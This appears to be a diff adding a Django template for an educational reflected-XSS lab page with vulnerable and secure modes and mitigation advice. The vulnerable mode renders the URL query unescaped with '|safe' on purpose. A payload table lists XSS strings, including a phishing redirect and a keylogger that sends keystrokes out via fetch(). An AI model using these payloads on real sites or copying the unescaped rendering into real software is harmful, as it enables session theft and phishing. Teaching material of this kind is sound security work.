@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reflected XSS Demo — {{ mode|title }}</title>
+    <style>
+        /* ── Reset & Base ── */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0f0f1a;
+            color: #e0e0e0;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .banner {
+            background: linear-gradient(135deg, #e65100, #bf360c);
+            color: #fff;
+            text-align: center;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            letter-spacing: 1px;
+        }
+
+        .nav-bar {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .nav-bar a {
+            color: #aaa;
+            text-decoration: none;
+            margin: 0 14px;
+            font-size: 14px;
+            transition: color 0.2s;
+        }
+        .nav-bar a:hover, .nav-bar a.active { color: #fff; font-weight: bold; }
+
+        h1 {
+            text-align: center;
+            font-size: 28px;
+            margin-bottom: 6px;
+            color: #fff;
+        }
+        .page-subtitle {
+            text-align: center;
+            color: #888;
+            margin-bottom: 24px;
+            font-size: 14px;
+        }
+
+        .mode-switch {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .mode-switch a {
+            display: inline-block;
+            padding: 10px 24px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 14px;
+            margin: 0 8px;
+            transition: all 0.2s;
+        }
+        .mode-switch .vuln-btn {
+            background: {% if mode == 'vulnerable' %}#e74c3c{% else %}#2a2a3e{% endif %};
+            color: #fff;
+            border: 2px solid #e74c3c;
+        }
+        .mode-switch .sec-btn {
+            background: {% if mode == 'secure' %}#2ecc71{% else %}#2a2a3e{% endif %};
+            color: #fff;
+            border: 2px solid #2ecc71;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .form-card {
+            background: #1a1a2e;
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 24px;
+            border: 2px solid {% if mode == 'vulnerable' %}#e74c3c{% else %}#2ecc71{% endif %};
+        }
+        .form-card h2 {
+            color: {% if mode == 'vulnerable' %}#e74c3c{% else %}#2ecc71{% endif %};
+            margin-bottom: 6px;
+            font-size: 18px;
+        }
+        .form-card .form-subtitle {
+            color: #888;
+            font-size: 12px;
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 4px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px 12px;
+            margin-bottom: 14px;
+            border: 1px solid #333;
+            border-radius: 6px;
+            background: #0f0f1a;
+            color: #e0e0e0;
+            font-size: 14px;
+        }
+        input:focus { outline: none; border-color: #666; }
+
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        .btn:hover { opacity: 0.85; }
+        .btn-danger { background: #e74c3c; color: #fff; }
+        .btn-success { background: #2ecc71; color: #fff; }
+
+        /* ── Search Result ── */
+        .result-section {
+            background: #1a1a2e;
+            border-radius: 12px;
+            padding: 24px;
+            border: 1px solid #333;
+            margin-bottom: 24px;
+        }
+        .result-section h3 {
+            color: #f39c12;
+            margin-bottom: 14px;
+            font-size: 16px;
+        }
+        .result-content {
+            background: #0f0f1a;
+            border: 1px solid #2a2a3e;
+            border-radius: 8px;
+            padding: 16px;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .result-label {
+            color: #888;
+            font-size: 12px;
+            margin-bottom: 6px;
+        }
+
+        /* ── Crafted URL ── */
+        .url-box {
+            background: #111;
+            padding: 14px;
+            border-radius: 8px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 12px;
+            color: #f39c12;
+            margin-top: 16px;
+            overflow-x: auto;
+            word-break: break-all;
+        }
+
+        /* ── Info / Steps ── */
+        .info-box {
+            max-width: 800px;
+            margin: 0 auto 24px;
+            background: #1a1a2e;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 24px;
+        }
+        .info-box h3 { color: #f39c12; margin-bottom: 12px; }
+        .info-box code {
+            background: #111;
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: #e74c3c;
+            font-size: 13px;
+        }
+        .info-box li { margin-bottom: 8px; line-height: 1.5; font-size: 14px; }
+
+        .step-box {
+            background: #111;
+            border-left: 4px solid {% if mode == 'vulnerable' %}#e74c3c{% else %}#2ecc71{% endif %};
+            padding: 14px;
+            border-radius: 0 8px 8px 0;
+            margin: 12px 0;
+            font-size: 13px;
+            line-height: 1.7;
+        }
+        .step-box .step-num {
+            color: {% if mode == 'vulnerable' %}#e74c3c{% else %}#2ecc71{% endif %};
+            font-weight: bold;
+        }
+
+        /* ── Mitigation ── */
+        .mitigation {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #0d2818;
+            border: 2px solid #2ecc71;
+            border-radius: 12px;
+            padding: 24px;
+        }
+        .mitigation h3 { color: #2ecc71; margin-bottom: 12px; }
+        .mitigation li { margin-bottom: 8px; line-height: 1.5; font-size: 14px; }
+        .mitigation code {
+            background: #111;
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: #2ecc71;
+            font-size: 13px;
+        }
+        .mitigation pre {
+            background: #111;
+            padding: 14px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-size: 12px;
+            color: #f39c12;
+            margin-top: 8px;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="banner">
+        ⚠️ EDUCATIONAL DEMO ONLY — Reflected XSS Demonstration ⚠️
+    </div>
+
+    <div class="nav-bar">
+        <a href="/xss/">⚡ Dashboard</a>
+        <a href="/xss/stored/vulnerable/">💾 Stored XSS</a>
+        <a href="/xss/reflected/vulnerable/" class="{% if mode == 'vulnerable' %}active{% endif %}">🔄 Reflected XSS</a>
+        <a href="/xss/dom/">🌐 DOM XSS</a>
+    </div>
+
+    <h1>🔄 Reflected XSS (Non-Persistent)</h1>
+    <p class="page-subtitle">Malicious scripts are reflected back from the server via URL parameters</p>
+
+    <div class="mode-switch">
+        <a href="/xss/reflected/vulnerable/" class="vuln-btn">🔴 Vulnerable</a>
+        <a href="/xss/reflected/secure/" class="sec-btn">🟢 Secure</a>
+    </div>
+
+    <div class="container">
+
+        <!-- How It Works -->
+        <div class="info-box">
+            <h3>{% if mode == 'vulnerable' %}⚠️ How the Attack Works{% else %}✅ How the Protection Works{% endif %}</h3>
+
+            {% if mode == 'vulnerable' %}
+            <div class="step-box">
+                <p><span class="step-num">STEP 1:</span> Attacker crafts a URL with malicious JS in the query parameter</p>
+                <p><span class="step-num">STEP 2:</span> Victim clicks the malicious link (e.g., from an email or chat)</p>
+                <p><span class="step-num">STEP 3:</span> Server reflects the query back in the response using <code>|safe</code></p>
+                <p><span class="step-num">STEP 4:</span> Victim's browser executes the script → session stolen, cookies leaked, etc.</p>
+            </div>
+            <p style="margin-top:12px; font-size:13px; color:#888;">
+                Template code: <code>{% verbatim %}{{ query|safe }}{% endverbatim %}</code> ← renders raw HTML from URL parameter
+            </p>
+            {% else %}
+            <div class="step-box">
+                <p><span class="step-num">STEP 1:</span> Attacker crafts a URL with malicious JS in the query parameter</p>
+                <p><span class="step-num">STEP 2:</span> Victim clicks the malicious link</p>
+                <p><span class="step-num">STEP 3:</span> Server reflects the query back but Django <strong>auto-escapes</strong> it</p>
+                <p><span class="step-num">STEP 4:</span> Browser displays the script as plain text — <strong>attack blocked!</strong></p>
+            </div>
+            <p style="margin-top:12px; font-size:13px; color:#888;">
+                Template code: <code>{% verbatim %}{{ query }}{% endverbatim %}</code> ← Django auto-escapes HTML entities
+            </p>
+            {% endif %}
+        </div>
+
+        <!-- Search Form -->
+        <div class="form-card">
+            <h2>{% if mode == 'vulnerable' %}🔴 Search (Vulnerable){% else %}🟢 Search (Secure){% endif %}</h2>
+            <p class="form-subtitle">
+                {% if mode == 'vulnerable' %}
+                Try: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> or
+                <code>&lt;img src=x onerror=alert('Reflected!')&gt;</code>
+                {% else %}
+                Try the same payloads — they will be safely escaped
+                {% endif %}
+            </p>
+
+            <form method="GET" action="{% if mode == 'vulnerable' %}/xss/reflected/vulnerable/{% else %}/xss/reflected/secure/{% endif %}">
+                <label for="search">Search Query</label>
+                <input type="text" id="search" name="q" placeholder="Enter search term (or XSS payload)" value="{{ query }}">
+
+                <button type="submit" class="btn {% if mode == 'vulnerable' %}btn-danger{% else %}btn-success{% endif %}">
+                    Search
+                </button>
+            </form>
+        </div>
+
+        <!-- Payload Examples -->
+        <div class="payload-section" style="background: #1a1a2e; border: 1px solid #333; border-radius: 12px; padding: 24px; margin-bottom: 24px;">
+            <h3 style="color: #f39c12; margin-bottom: 14px; font-size: 16px;">💡 Malicious Payload Examples</h3>
+            <p style="color: #aaa; font-size: 13px; margin-bottom: 16px;">Try pasting these into the search box to see how they work.</p>
+            
+            <table style="width: 100%; border-collapse: collapse; font-size: 13px;">
+                <tr style="border-bottom: 1px solid #333;">
+                    <th style="text-align: left; padding: 10px; color: #888;">Attack Type</th>
+                    <th style="text-align: left; padding: 10px; color: #888;">Payload</th>
+                    <th style="text-align: left; padding: 10px; color: #888;">Description</th>
+                </tr>
+                <tr style="border-bottom: 1px solid #2a2a3e;">
+                    <td style="padding: 10px; font-weight: bold; color: #e74c3c;">Phishing Redirection</td>
+                    <td style="padding: 10px;"><code>&lt;script&gt;window.location='http://example.com/fake-login'&lt;/script&gt;</code></td>
+                    <td style="padding: 10px; color: #aaa;">Immediately redirects the victim to a fake phishing site controlled by the attacker.</td>
+                </tr>
+                <tr style="border-bottom: 1px solid #2a2a3e;">
+                    <td style="padding: 10px; font-weight: bold; color: #e67e22;">Filter Bypass (Events)</td>
+                    <td style="padding: 10px;"><code>&lt;img src="x" onerror="alert('XSS Payload Executed!')"&gt;</code></td>
+                    <td style="padding: 10px; color: #aaa;">Uses an invalid image source to trigger an <code>onerror</code> event. Bypasses simple filters that block <code>&lt;script&gt;</code> tags.</td>
+                </tr>
+                <tr>
+                    <td style="padding: 10px; font-weight: bold; color: #9b59b6;">Keylogger</td>
+                    <td style="padding: 10px;"><code>&lt;script&gt;document.onkeypress=function(e){fetch('http://127.0.0.1:8000/?key='+e.key)}&lt;/script&gt;</code></td>
+                    <td style="padding: 10px; color: #aaa;">Records every keystroke the victim types on the page and sends it to the attacker.</td>
+                </tr>
+            </table>
+        </div>
+
+        <!-- Search Result -->
+        {% if query %}
+        <div class="result-section">
+            <h3>🔍 Search Results for:</h3>
+            <div class="result-content">
+                <p class="result-label">Your search query was:</p>
+                {% if mode == 'vulnerable' %}
+                    <p>{{ query|safe }}</p>
+                {% else %}
+                    <p>{{ query }}</p>
+                {% endif %}
+                <p style="color:#666; margin-top:12px; font-size:12px;">
+                    (No actual search performed — this demo shows how the query is rendered)
+                </p>
+            </div>
+
+            {% if mode == 'vulnerable' %}
+            <div class="url-box">
+                <strong>Malicious URL an attacker would send:</strong><br>
+                {{ request.build_absolute_uri }}
+            </div>
+            {% endif %}
+        </div>
+        {% endif %}
+
+    </div>
+
+    <!-- Mitigation -->
+    <div class="mitigation">
+        <h3>🛡️ Mitigation Techniques for Reflected XSS</h3>
+        <ul>
+            <li><strong>Output Encoding:</strong> Always use Django's auto-escaping. Never use <code>|safe</code> on user input from URL parameters.</li>
+            <li><strong>Input Validation:</strong> Validate and sanitize query parameters on the server side before reflecting them.</li>
+            <li><strong>Content Security Policy:</strong> Add CSP headers: <code>Content-Security-Policy: script-src 'self'</code></li>
+            <li><strong>URL Encoding:</strong> Encode special characters in URLs before reflecting them</li>
+            <li><strong>X-XSS-Protection Header:</strong> Enable browser's built-in XSS filter (legacy but still useful)</li>
+        </ul>
+        <pre>
+{% verbatim %}# SAFE -- Django auto-escapes URL parameters
+{{ query }}
+
+# DANGEROUS -- Renders raw HTML from URL
+{{ query|safe }}{% endverbatim %}
+
+# ✅ ADD THESE SECURITY HEADERS in settings.py
+SECURE_BROWSER_XSS_FILTER = True
+SECURE_CONTENT_TYPE_NOSNIFF = True
+
+# ✅ CSP MIDDLEWARE example
+# Content-Security-Policy: default-src 'self'; script-src 'self'
+        </pre>
+    </div>
+
+</body>
+</html>
